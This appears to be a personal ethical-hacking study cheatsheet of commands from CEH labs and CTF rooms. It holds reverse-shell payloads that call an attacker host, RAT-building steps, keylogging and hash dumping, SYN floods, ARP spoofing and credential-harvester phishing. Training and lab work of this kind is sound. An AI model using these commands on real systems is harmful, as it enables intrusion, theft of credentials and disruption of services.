# Ethical Hacking Cheatsheet

## EC Council iLabs

### Lab 1 - Footprinting and Reconnaissance
#### Tools and Commands
1. Google Dorks (https://www.exploit-db.com/google-hacking-database)
2. Youtube metadata (https://mattw.io/youtube-metadata) - can be used to find geolocation, video metadata, and reverse image search the thumbnail
3. FTP search engines (https://www.searchftps.net/)
4. IoT search engines (https://www.shodan.io)
5. Domain and subdomains (https://www.netcraft.com)
6. People search (https://www.peekyou.com)
7. Gather emails (theHarvester)
8. Sherlock (people search)

### Lab 2 - Scanning Networks - TODO SAVED
#### Tools and Commands
1. nmap
   - ```nmap -sn -PR <target ip/range>``` (-sn disables port scan, -PR performs arp ping scan) -> host discovery
   - ```nmap -sn -PU <target ip/range>``` (-PU performs UDP Ping scan)
   - ```nmap -sn -PE <target ip/range>``` (-PE performs ICMP ECHO Ping scan)
   - ```nmap -sn -PP <target ip/range>``` (-PP performs ICMP timestamp ping scan)
   - ```nmap -sn - PM <target ip/range>``` (-PM performs ICMP address mask ping scan)
   - ```nmap -sn -PS <target ip/range>``` (-PS performs TCP SYN Ping scan)
   - ```nmap -sn -PA <target ip/range>``` (-PA performs TCP ACK Ping scan)
   - ```nmap -sn -PO <target ip/range>``` (-PO performs IP Protocol Ping scan)
   - ```nmap -O <target ip>``` (OS discovery, runs hosts scripts like smb-os-discovery.nse)
   - ```nmap --script smb-os-discovery.nse <target IP>``` (attempts to determine the OS, computer name, domain, workgroup, and current time over SMB)
   - ```nmap -f <target ip>``` (fragmentation scan)
   - ```nmap -g <source port> <target ip>``` (manipulate source port to evade IDS, ex.: port 80)
   - ```nmap -D RND:10 <target ip>``` (-D performs a decoy scan, RND generates random non-reserved IP addresses, here 10)
   - ```nmap -sT -Pn --spoof-mac 0 <target ip>``` (--spoof-mac 0 represents randomizing the MAC address, -Pn skips host discovery)
2. Angry IP Scanner (windows)
   - set ip range
   - click the ```Preferences``` button (settings icon)
   - select pinging method
   - select ```Alive hosts (responding to pings) only``` under the ```Display``` tab and click ok
   - click ```Start``` to scan
   - This is good for finding hosts, not for ports
3. MegaPing (windows)
   - IP scanner option
      - Enter IP range and start
   - Port Scanner option
      - Enter target IP and click ```Add```
      - Select checkbox of the target
      - Click ```Start```
4. NetScanTools Pro (windows)
   - Under ```Manual Tools (all)``` scroll down and select ```Ping Scanner```
   - Enter IP range and click ```Start```
   - The result appears in the browser
   - Under ```Manual Tools (all)``` scroll down and select ```Port Scan```
   - Enter target IP, set port range and scan mode
   - Click ```Scan Range of Ports```
5. sx
   - ```sx arp <target ip/range>```
   - ```sx arp <target subnet> --json | tee arp.cache``` (converts to json and writes to stdin)
   - ```cat arp.cache | sx tcp -p 1-65535 <target ip>``` (lists all open tcp ports on the target machine)
   - ```cat arp.cache | sx udp --json -p <target port(s)> <target ip>``` (checks if UDP port is open, has no response if port is open)
6. Zenmap (windows)
   - input the nmap command on ```Command``` and click ```Scan```
   - click the ```Ports/Hosts``` tab for more information
   - click ```Services``` to see active services on targets
7. Hping3
   - ```hping3 -A <target ip> -p <port> -c <number of packets>``` (-A specifies the ACK flag)
   - ```hping3 -8 <port-range> -S <target ip> -V``` (-8 specifies a scan mode, -V specifies verbose mode)
   - ```hping3 -F -P -U <target ip> -p <port> -c <packet count>``` (-F specifies the FIN flag, -P the PSH flag, -U the URG flag)
   - ```hping3 --scan <port-range> -S <target ip>```
   - ```hping3 -1 <target ip> -p <port> -c <packet count>``` (-1 specifies ICMP ping scan)
8. Unicornscan
   - ```unicornscan <target ip> -Iv``` (-I specifies immediate mode, -v specifies verbose)


### Lab 3 - Enumeration
#### Tools and Commands
1. NBTSTAT (windows)
   - ```nbtstat -a <target IP>``` (-a displays the NetBIOS name table of a remote computer)
   - ```nbtstat -c``` (-c lists the contents of the NetBIOS name cache of the remote computer)
   - ```net use```
2. NetBIOS Enumerator (Windows)
   - insert target subnet range and click ```Scan```
   - wait for debug window to say ```Ready```
   - expand the ```+``` icons next to the IPs to display more details
3. Nmap
   - NetBIOS enumeration:
      - ```nmap -sV -v --script nbtstat.nse <target IP>``` (-v enabled verbose output)
      - ```nmap -sU -p 137 --script nbtstat.nse <target IP>``` (UDP scan)
   - SNMP enumeration:
      - ```nmap -sU -p 161 <Target IP>``` (checks if SNMP port is open)
      - ```nmap -sU -p 161 --script snmp-sysdescr.nse <Target IP>```
      - ```nmap -sU -p 161 --script snmp-processes.nse <Target IP>```
      - ```nmap -sU -p 161 --script snmp-win32-software.nse <Target IP>```
      - ```nmap -sU -p 161 --script snmp-interfaces.nse <Target IP>```
   - LDAP enumeration:
      - ```nmap -sU -p 389 <Target IP>``` (checks if LDAP port is open)
      - ```nmap -p 389 --script ldap-brute --script-args ldap.base='<whatever we want to brute>' <Target IP>``` (If ldap.base is set the script uses it as a base for the password guessing attempts. Args used in lab: "cn=users,dc=CEH,dc=com")
   - DNS
      - ```nmap --script broadcast-dns-service-discovery <target domain>```
      - ```nmap -T4 -p 53 --script dns-brute <target domain>```
      - ```nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='<target domain>'```
   - SMTP
      - ```nmap -p 25 --script smtp-enum-users <target ip>```
      - ```nmap -p 25 --script smtp-open-relay <target ip>```
      - ```nmap -p 25 --script smtp-commands <target ip>```
4. snmp-check
   - ```snmp-check <target IP>``` (pay attention to system information and user accounts)
5. SoftPerfect Network Scanner (Windows search for network scanner)
   - ```Options > Remote SNMP...```
   - Insert IP range and click ```Start Scanning```
   - You can access devices from the list: ```Open device``` > Select whatever option you want
6. SnmpWalk
   - ```snmpwalk -v<version 1, 2c or 3> -c <community string> <target IP>``` (for this lab ```snmpwalk -v1 -c public 10.10.1.22```)
7. AD Explorer
8. Python
   - ```python3```
   - ```import ldap3```
   - ```server=ldap3.Server('[Target IP Address]', get_info=ldap3.ALL,port=[Target Port])```
   - ```connection=ldap3.Connection(server)```
   - ```connection.bind()```
   - ```server.info```
   - ```connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*')```
   - ```connection.entries```
9. ldapsearch
    - ```ldapsearch -h <target IP> -x -s base namingcontexts``` (-x specifies simple authentication, -s specifies the scope)
    - ```ldapsearch -h <target IP> -x -b "DC=CEH,DC=com"``` (-b specifies the base DN for search)
    - ```ldapsearch -h <target IP> -x -b "DC=CEH,DC=com" "objectclass=*"```
10. SuperEnum
    - ```echo <target IP> > target.txt```
    - ```./superenum```
11. RPCScan
    - ```python3 rpc-scan.py <target IP> --rpc```
12. dig
    - ```dig ns <target domain>```
    - ```dig @<name server> <target domain> axfr``` (axfr retrieves zone information)
13. DNSRecon
    - ```chmod +x ./dnsrecon.py```
    - ```./dnsrecon.py -h```
    - ```./dnsrecon.py -d <target domain> -z```

### Lab 4 - Vulnerability Analysis
#### Tools and Commands
1. CWE (Common Weaknesses Enumeration)
2. CVE (Common Vulnerabilities and Exposures)
3. NVD (National Vulnerability Database)
4. OpenVAS Greenbone
   - ```Applications``` > ```Pentesting``` > ```Vulnerability Analysis``` > ```OpenVAS Greenbone``` > ```Start Greenbone Vulnerability Manager Service```
   - Go to IP address after it initializes on command line
   - ```Scans``` > ```Tasks``` > hover over the wand icon > ```Task Wizard```
   - Insert target IP and click start. The scan will take a while to end
   - Click ```Done``` after scan completes
5. Nessus (Windows)
   - ```https://localhost:8834/```
   - ```Policies > Create a new policy > Advanced Scan```
   - ```My Scans > New Scan > User Defined > <Policy created on previous step>```
   - Set targets and other options and click the dropdown next to ```Save``` to select ```Launch```
6. Nikto
   - ```Pentesting > Web Application Analysis > Web Vulnerability Scanners > nikto```
   - ```nikto -h <target website> -Tuning x``` (A tuning scan can be used to decrease the number of tests performed against a target)

### Lab 5 - System Hacking
#### Tools and Commands
1. Responder
   - ```sudo python2 ./Responder.py -I eth0```
2. L0phtCrack 7 (windows)
   - Password Auditing Wizard
   - Can generate a report at the end
3. msfvenom
   - ```msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker IP> LPORT=<attacker port> -o <path/to/savefile.exe>``` (create a reverse tcp payload for windows machine)
   - ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip address> LPORT=<local port> EXITFUNC=thread -f c -a x86 -b "\x00``` (create a reverse tcp shellcode for buffer overflow on windows machine)
4. Metasploit
   - use ```exploit/multi/handler``` and set options to get reverse tcp session from file created with msfvenom
   - ```set payload windows/meterpreter/reverse_tcp```
   - ```exploit -j -z``` to start the handler
   - ```run vnc``` to show the victim's desktop
   - ```run post/windows/gather/smart_hashdump``` (dump user account hashes)
   - ```getsystem -t 1``` attempts to gain admin privileges. Use it after the following command to get admin privileges:
   - (in prompt `msf exploit(multi/handler)`, use `background` if anything is running to return to this prompt) `use exploit/windows/local/bypassuac_fodhelper` to gain privileges. Use `set TARGET <id>` in reverse tcp to access that host.
   - `set SESSION <id>` to return to a backgrounded session
   - `timestomp <filename> -v` displays the cerated, accessed, modified, and entry modified times.
   - `timestomp <file> -m "dd/mm/yy hh:mm:ss"` changes the modified time value of the file (-m for modified, -a for accessed, -c for created, and -e for entry)
   - `search -f <filename>`
   - `keyscan_start` to start keylogging
   - `keyscan_dump` to display captured keystrokes
   - `load kiwi` to load Mimikatz (`help kiwi` to display available commands)
   - `lsa_dump_sam` get the hashes
   - `password_change -u Admin -n <hash from previous step> -P <new password>`
5. Armitage
   - Applications > Pentesting > Exploitation Tools > Metasploit Framework > Armitage
   - Click ```connect```
   - ```Hosts > Nmap scan > Intense scan```
   - Select any payload and create it (like using msfvenom with a GUI). Use type ```multi/handler``` to launch the exploit (double click the name on Armitage)
   - Right-click on the compromised host and do whatever you want
6. Ninja Jonin (windows)
   - Modify `constants.json` (hostname and host ip of the victim)
   - Launch it and a command prompt window appears. Press any key to start the listener
   - `list` to show a list of available targets
   - `connect <index>` to connect to a target
   - `change` followed by `cmd` (get a cmd session)
   - `#help` to view available commands
7. Buffer overflow scripts
   - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <size in bytes> -q <pattern from EIP>` (returns the offset of the register)
     `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
8. BeRoot
   - (in metasploit with reverse tcp) `upload <path to beRoot.exe>`
   - `beRoot.exe` to run the file in victim's shell
9. GhostPack Seatbelt
   - (in metasploit with reverse tcp) `upload <path to Seatbelt.exe>`
   - `Seatbelt.exe -group=system` to run the file in victim's shell and gather information (other information with `-group=user` and `-group=misc`)
10. PowerSpy (windows)
   - `Start monitoring` (if asks to reboot click ok)
   - `Stealth Mode`
   - `CTR+ALT+X` to unhide PowerSpy
11. Spytech SpyAgent (windows)
   - password: spytech
   - `Start Monitoring`
   - `CTR+Shift+ALT+M` to unhide
12. Snow (windows)
   - `snow -C -m "<secret message>" -p "<password>" <original file> <output file>`
   - `snow -C -p "<password>" <file>` to read contents of file
13. OpenStego (windows)

### Lab 6 - Malware Threats
#### Tools and Commands
1. njRAT
   - Windows exe GUI
   - ```[Builder]``` (specify host as attacker IP and click build)
   - Send to victim and wait for execution
2. SwayzCryptor
   - Windows GUI
   - Cryptor for pre-generated malware (can be njRAT)
   - check ```Start up```, ```Mutex```, and ```Disable UAC```, and then ```Encrypt```
3. Theef RAT Trojan
   - Run server on target machine
   - Open client on attacker machine and enter target IP
   - Click Connect
4. JPS Virus Maker Tool
   - Select virus characteristics
   - Select trigger (radio buttons, default None)
   - Click the ```>``` arrow
   - Configure more options
   - Create virus
5. bintext
   - Windows GUI string analysis tool
6. PEid
   - Windows GUI find packers and obfuscators tool
7. Detect It Easy (DIE)
   - Windows GUI ELF analysis tool
8. PE Explorer
   - Windows malware executable info viewer
9. Dependency Walker
   - List all dependent modules of an executable file
10. IDA (disassembler)
    - Windows GUI tool
11. OllyDbg (disassembler/debugger)
    - Windows GUI tool
12. Ghidra
    - Windows GUI tool
13. TCPView (Port monitoring tool)
14. ProcessMonitor
15. Reg Organizer (registry monitoring tool)
16. Windows Service Manager (SrvManager)
17. WinPatrol
18. Mirekusoft Install Monitor (intallation monitoring)
19. PA File Sight (file and folder monitoring)
20. DriverViewer (driver monitoring)
21. DNSQuerySniffer (DNS monitoring)

### Lab 7 - Sniffing
#### Tools and Commands
1. macof (MAC flooding with random MAC addresses)
   - ```macof -i eth0 -n 10``` (-i specifies the interface, -n the number of packets. Can be used with ```-d <target ip>```)
2. Yersinia (DHCP starvation)
   - ```yersinia -I``` (-I start an interactive ncurses session, press ```h``` for help)
   - press F2 to select DHCP Fields.
   - press ```x``` to list available attack options
   - press 1 to start the attack
   - press ```q``` to stop the attack and exit Yersinia
3. arpspoof (ARP Poisoning)
   - ```arpspoof -i <inteface> -t <acess point or gateway IP> <target IP>``` (informs the gateway that the target has our MAC address; they think we are the target system)
   - ```arpspoof -i <inteface> -t <target IP> <acess point or gateway IP>``` (informs the target system that it is the access point)
4. Cain & Abel (MITM)
   - Tool on Windows machine
   - Click ```Configure```, ensure the adapter associated with the IP address of the machine is selected and click Ok
   - Click ```Start/Stop Sniffer``` icon (next to folder icon)
   - Click on the ```Sniffer``` tab
   - Right-click and select ```Scan MAC Addresses```; select ```All hosts in my subnet``` and ```All Tests```
   - Click the ```APR``` tab and then click the ```+``` icon
   - Select one IP from the left pane and one from the right (monitor traffic between those 2)
   - Select the created target IP and click ```Start/Stop APR``` to poison the target (icon next to ```Start/Stop Sniffer``` icon)
   - Click the ```Passwords``` tab to check captured data
5. TMAC (MAC address spoofing)
   - Windows tool
   - GUI tool to change MAC addresses
6. SMAC
   - Windows tool
   - GUI tool to change MAC addresses
7. OmniPeek (didn't use it because it was a free trial, probably not important)
8. Habu (open source pentesting toolkit)
   - ```habu.arp.poison <target IP> <attacker IP>``` (poison communication between target and attacker)

### Lab 8 - Social Engineering
#### Tools and Commands
1. Social Engineering Toolkit: ```./setoolkit``` to use
2. Netcraft (browser extension)
3. Phishthank (www.phishtank.com)

### Lab 9 - Denial of Service
#### Tools and Commands
1. Metasploit
   - ```search <keyword>``` find exploits
   - ```use <exploit path>``` use exploit
   - ```show options``` show exploit options
   - ```exploit``` run the exploit
2. hping3
   - DoS: ```hping3 -S <target IP> -a <spoof IP for attacker> -p <port> --flood``` (-S sets the SYN flag)
   - Ping of Death: ```hping3 -d <packet size> -S -p 21 --flood <target IP>``` (packet size used in lab: 65538)
   - UDP flood in NetBIOS: ```hping3 -2 -p 139 <target IP>``` (-2 specifies UDP mode)
3. Raven Storm
   - Start: ```sudo rst```
4. HOIC
5. LOIC

### Lab 10 - Session Hijacking
#### Tools and Commands
1. ZAP (Zed's Attack Proxy)
   - Configure proxy: open ```options``` (settings icon) > ```local proxies```
   - Set break on all requests (click green dot, it turns red)
2. bettercap
   - ```bettercap -iface <inteface>```
   - ```net.probe on``` (sends different types of probe packets in the current subnet for net.recon to detect them)
   - ```net.recon on``` (sniffs network packets)
   - ```set http.proxy.sslstrip true``` (enables SSL stripping)
   - ```set arp.spoof.targets <target ip>``` (spoofs the address of the target host)
   - ```http.proxy on``` (initiates http proxy)
   - ```arp.spoof on``` (initiates arp spoofing)
   - ```net.sniff on``` (performs sniffing on the network)
   - ```set net.sniff.regexp '<regex>'``` (used on this lab: ```.*password=.+```)
3. Hetty
   - Double-click launcher on windows and open ```http://localhost:8080``` on browser
   - Click ```Manage Projects```
   - Click ```Proxy Logs``` icon
   - Configure browser to use proxy
4. Wireshark

### Lab 11 - Evading IDS, Firewalls, and Honeypots
#### Tools and Commands
1. Snort
   - Install Snort on windows
   - Copy `snort.conf` from the `etc` folder and paste it on the installation location. Copy the `so_rules`, `preproc_rules` and `rules` folders and paste it on `C:/Snort`.
   - `cd C:\Snort\bin`
   - `snort` (wait for initialization and then press Ctrl+C)
   - `snort -W` (lists your machine IP address and ethernet drivers)
   - `snort -dev -i <driver number, checked on previous command>` (enables the driver)
   - `snort -i<driver number> -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii` (this step involves modifying the conf file, not recommendable)
2. ZoneAlarm Free Firewall
3. Nmap
   - `nmap -sS <ip>` (TCP SYN scan)
   - `nmap -sP <subnet>` (Ping Sweep)
   - `nmap -sI <zombie ip> <victim ip>` (Zombie nmap)

### Lab 12 - Hacking Web Servers
#### Tools and Commands
1. Ghost Eye (python tool)
   - ```python3 ghost_eye.py```
   - Choose one of the numbers to proceed
3. Skipfish (security reconnaissance)
   - ```skipfish -o <directory to save report> -S /usr/share/skipfish/dictionaries/complete.wl http://<target IP>:<target port>```
   - Open index.html to see the report
5. Httprecon (windows) and ID Serve (windows)
6. Netcat
   - ```nc -vv <url> <port>```
   - in nc terminal: ```GET / HTTP/1.0```
7. Nmap
   - ```nmap -sV --script http-enum <target website>```
   - ```nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- <target website>```
   - ```nmap --script http-trace -d <target website>```
   - ```nmap -p80 --script http-waf-detect <website>``` (probes target with malicious payloads and detects the changes in response code)
8. Uniscan
   - ```uniscan -u <target website> -q``` (-q to search for directories)
   - ```uniscan -u <target website> -we``` (-w checks robots.txt and -e checks sitemap.xml)
   - ```uniscan -u <target website> -d``` (-d means dynamic scan, tests for all sorts of vulnerabilities)
   - report can be found in ```/usr/share/uniscan/report```
9. THC Hydra
    - ```hydra -L <path to usernames.txt> -P <path to passwords.txt> ftp://<ip address of target>``` (to crack FTP credentials)
  
### Lab 13 - Hacking Web Applications
#### Tools and Commands
1. whatweb
   - This will give you information on the website (including IP address)
   - ```whatweb``` (to see commands available)
   - ```whatweb <target web application>``` (use -v for a verbose output)
   - ```whatweb --log-verbose=<output file> <target web application>``` (store verbose report in output file)
3. OWASP ZAP
   - ```zaproxy```
   - Click in ```No, I do not want to persist this session...```. If a manage add-ons window appears click close
   - ```Automated Scan```, insert target url and click ```Attack```
   - Vulnerabilities are displayed in the ```Alerts``` tab
4. Detecting load balancers:
   - ```lbd <domain>```
5. Gobuster
   - ```gobuster dir -u <url> -w <wordlist>```
6. dirsearch
   - ```python3 dirsearch.py -u <url>```
   - ```python3 dirsearch.py -u <url> -e <extension>```
   - ```python3 dirsearch.py -u <url> -x 403``` (excludes status code 403)
7. Vega (windows)
   - ```Scan > Start new scan```
   - Check vulnerabilities in left hand pane
8. ClickjackPoc
   - ```echo "http://www.moviescope.com" | tee domain.txt```
   - ```python3 clickJackPoc.py -f domain.txt```
   - open created file
9. BurpSuite
   - set web browser proxy to ```127.0.0.1:8080```
   - open the Proxy tab
   - right-click on received responses and ```send to intruder```
   - go to ```intruder > positions``` and click ```Clear $``` (clear fields) and select attack type from dropdown
   - select username and password and click ```Add $```
   - go to ```intruder > payloads``` to select wordlists to use
10. PwnXSS
    - ```python3 pwnxss.py -u <target url>```
11. WPScan
    - ```wpscan --api-token <API token> --url <target url> --enumerate u``` (enumerates usernames. The API token needs registration at https://wpscan.com/register but it works without it, it seems)
    - ```wpscan --api-token <API token> --url <target url> --plugins-detection aggresive --enumerate vp``` (enumerates vulnerable plugins.)
12. Metasploit
    - Before starting the console, start the PostgreSQL service ```service postgresql start```
    - ```msfconsole```
    - ```use auxiliary/scanner/http/wordpress_login_enum```
    - ```set PASS_FILE <path to file>```
    - ```set RHOST <target IP>```
    - ```set RPORT <target port>```
    - ```set TARGETURI http://<target ip>:<target port>/<whatever>```
    - ```set USERNAME <a username we enumerated with wpscan>```
    - ```run```
    - msfvenom
       - ```msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<host port> -f raw``` and copy contents into a file
       - in msfconsole ```use exploit/multi/handler```
       - in msfconsole ```set LHOST <attacker ip>```
       - in msfconsole ```set LPORT <attacker port>```
       - in msfconsole ```set payload php/meterpreter/reverse_tcp``` and ```run```
13. Notes on Local File Inclusion
    - add .jpg to extension and if that still gets flagged add ```GIF98``` to the start of the file
    - if you actually need to change the extension (not add ```.php.jpeg``` but actually replace .php with .jpeg) try and exploit a command injection vulnerability to copy that file to another file with the correct extension
14. log4j was impossible to do

### Lab 14 - SQL Injection
#### Tools and Commands
1. sqlmap
  - ```sqlmap -u <url> --cookie="<cookie>" --dbs``` (-u specifies the url, cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases)
  - ```sqlmap -u <url> --cookie="<cookie>" -D <database name> --tables``` (-D specifies the DBMS database to enumerate, --tables enumerates the DBMS tables)
  - ```sqlmap -u <url> --cookie="<cookie>" -D <database name> -T <table name> --dump``` (-T specifies the table to enumerate)
  - ```sqlmap -u <url> --cookie="<cookie>" --os-shell``` (launches an interactive shell)
2. Damn Small SQLi Scanner (DSSS)
  - `cd DSSS` (it's a python script)
  - `python3 dsss.py -u "<url>" --cookie="<cookie copied from browser>"`
3. ZAP (scan for web vulnerabilities)
  - use an automated scan on the url to get a list of all found vulnerabilities including SQLi

### Lab 15 - Hacking Wireless Platforms
#### Tools and Commands
1. Wireshark
2. Aircrack-ng
   - ```aircrack-ng <path to WEP packet capture>```
   - ```aircrack-ng -a2 -b <target BSSID> -w <path to wordlist> <path to WPA2 packet capture>```

### Lab 16 - Hacking Mobile Platforms
#### Tools and Commands
1. msfvenom
   - ```service postgresql start```
   - ```msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<attacker IP> R > <path/to/filename.apk>``` (create an apk)
   - create a directory to share the apk
     - ```mkdir /var/www/html/share```
     - ```chmod -R 755 /var/www/html/share```
     - ```chown -R www-data:www-data /var/www/html/share```
   - ```service apache2 start```
   - ```cp <path to apk> <created directory>```
   - ```msfconsole```
     - ```use exploit/multi/handler```
     - ```set payload android/meterpreter/reverse_tcp```
     - ```set LHOST <attacker IP>```
     - ```show options``` (to check the listening port)
     - ```exploit -j -z```
     - ```sessions -i <id>``` (open session with id)
2. Social Engineering Toolkit
   - ```./setoolkit```
   - ```1```
   - ```2```
   - ```3``` (credential harvester)
   - ```2``` (site cloner)
   - ```<attacker IP>```
   - ```<site to clone>```
3. PhoneSploit
   - [go to directory of PhoneSploit] ```python3 -m pip install colorama```
   - ```python3 phonesploit.py```
   - if there's no prompt asking for phone IP then press ```3```
   - ```<target phone IP>```
   - ```4``` (access a shell)
4. AndroRAT
   - ```python3 androRAT.py --build -i <attacker IP> -p <listening port> -o <name.apk>``` (creates an APK)
   - share APK with target
   - ```python3 androRAT.py --shell -i 0.0.0.0 -p >listening port>```
   - ```help``` (to get more commands)
   - ```getSMS inbox```

### Lab 17 - IoT and OT Hacking
#### Tools and Commands
NOTHING WAS ACTUALLY HACKED, JUST SIMULATED AN IoT/OT NETWORK

### Lab 18 - Cloud Computing
#### Tools and Commands
1. lazys3
   - ```ruby lazys3.rb <CompanyName>```
2. S3Scanner
   - ```python3 ./s3scanner.py <file with sites to scan>```

### Lab 19 - Cryptography
#### Tools and Commands
1. HashCalc (Windows)
2. MD5 Calculator (Windows)
3. HashMyFiles (Windows)
4. CryptoForge (Windows)
5. BCTextEncoder (Windows)
6. VeraCrypt (Disk encryption)
7. BitLocker (Disk encryption)
8. Rohos Disk Encryption
9. CrypTool (Windows)
10. AlphaPeeler (Windows)

## OverTheWire

### Bandit
#### Tools and Commands
- Find unique words in a file: ```grep -wo "[[:alnum:]]\+" <input_file> | sort | uniq -u```
- Find repeated words in a file: ```grep -wo "[[:alnum:]]\+" input_file.txt | sort | uniq -d```
- Print all words and word counts on a file: ```grep -wo "[[:alnum:]]\+" input_file.txt | sort | uniq -c```
- Decode Base64: ```base64 -d <filename>```
- Decode substituion cipher (ROT13): ```cat <filename> | tr "$(echo -n {A..Z} {a..z} | tr -d ' ')" "$(echo -n {N..Z} {A..M} {n..z} {a..m} | tr -d ' ')"```
- Hexdump to file: ```xxd -r filename > outputfile```
- Open connection to server: ```nc <ip> <port>```
- Create a listening port: ```nc -l <port>```
- Enumerate from x to y on bash script: ```for i in {x..y}; do```
- Access bash from ```more``` and ```vim```: Make a really small window and when the more command appears type ```vi```. To create a shell use ```:set shell=/bin/bash``` and ```:shell```
- Read git repository tag: ```git show <tag>```

### Natas
#### Tools and Commands
This is a web page exploitation challenge
- Check page source
- Check Web Developer Tools
- Check ```robots.txt```
- ```curl "<url>" --user <username>:<password> --referer "<referer url>"```
- Check cookies. You can change values in web developer tools
- PHP: ```echo base64_decode(strrev(hex2bin(<secret>)));```
- Injection: ```grep -i <injection code> dictionary.txt``` (here: ```; cat etc/natas_webpass/natas10;```)
   - With character filters: ```.* <path to file>``` (prints every word of every file given)
LEVEL 11 -> 12 FAILED TODO

### Leviathan
#### Tools and Commands
- ```ltrace ./<executable>```
- Make symbolic link: ```ln -s <original file> <new file>```
- Bash file for generating 4 digit pin codes (don't forget to chmod):
  ```
  #!/bin/bash

   for a in {0000..9999}
   do
   ~/leviathan6 $a
   done
  ```

## Damn Vulnerable Web Application (DVWA)

## Try Hack Me
### Chocolate Factory
#### Tools and Commands
1. FTP
   - ```ftp <ip addr>```
2. Steghide
   - ```steghide --info <filename>```
   - ```steghide extract -sf <filename>```
3. Base64
   - ```base64 -d <fileToDecrypt>```
4. JohnTheRipper
   - ```john <passwordfile> --wordlist=/usr/share/wordlists/rockyou.txt```
5. PHP reverse shell on command input
   - ```php -r '$sock=fsockopen("<attacker ip>",<listening port netcat>);exec("/bin/bash -i <&3 >&3 2>&3");'```
  
### Expose
#### Tools and Commands
1. nmap
   - ```nmap -sV -sC <ip addr> -p-``` (took forever)
2. gobuster
   - ```gobuster dir -u <url> -w <wordlist> [-x <extensions>]```
3. Mosquitto (open service found on nmap)
   - ```mosquitto_sub -h 10.10.135.216 -p 1883 -t "/#" -d```
4. sqlmap
   - ```sqlmap -r <text from burp suite request> --dbs``` (lists all databases)
   - ```sqlmap -r <text from brup suite request> -D <database> --dump-all```
5. GTFOBins
   - ```/usr/bin/find . -exec /bin/sh -p \; -quit```
  
### Agent Sudo
#### Tools and Commands
1. Hydra
   - ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target ip>```
2. Binwalk
   - ```binwalk -e <file>```
3. Zip2John
   - ```zip2john <zip file> > hash.txt```
4. SCP
   - ```scp <user1>@<ip addr>/<filename> .```

### Anthem
#### Tools and Commands
1. Nmap
2. wget
   - ```Wget --recursive <url>```
3. grep
   - ```cd <directory where wget pages are saved>```
   - ```grep -r <keyword>```
4. rdesktop
   - ```rdesktop -u <user> 10.10.83.110```

### Bugged (IoT hacking)
#### Tools and Commands
1. Nmap
   - ```nmap -sV -sC -A -p- <target ip>```
2. Mosquitto
   - ```mosquitto_sub -h <target ip> -t "#"```
   - ```mosquitto_sub -h <target ip> -t <listening key pub_topic>```
   - ```mosquitto_pub -h <target ip> -t <listening key sub_topic> -m "<message>"``` (use to send messages and receive responses in the mosquitto_sub command, the one before this)

## Hack The Box

## Other Tools and Resources
- GTFOBins: https://gtfobins.github.io/
- Hacking book: https://book.hacktricks.xyz/welcome/readme
- Hacking cheatsheet: https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
- Pentest Monkey Cheat Sheet: https://pentestmonkey.net/
- Discover hosts in same network as Attacker Machine: ```netdiscover -r <ip subnet>``` or ```nmap <ip subnet>```
- Nmap scan all ports: ```nmap -A -p- <ip addr>```
- Search exploits from exploitdb: ```searchsploit <keyword>``` (only for kali?)
- Spawning a shell through Python: ```python -c 'import pty; pty.spawn("/bin/bash")'```
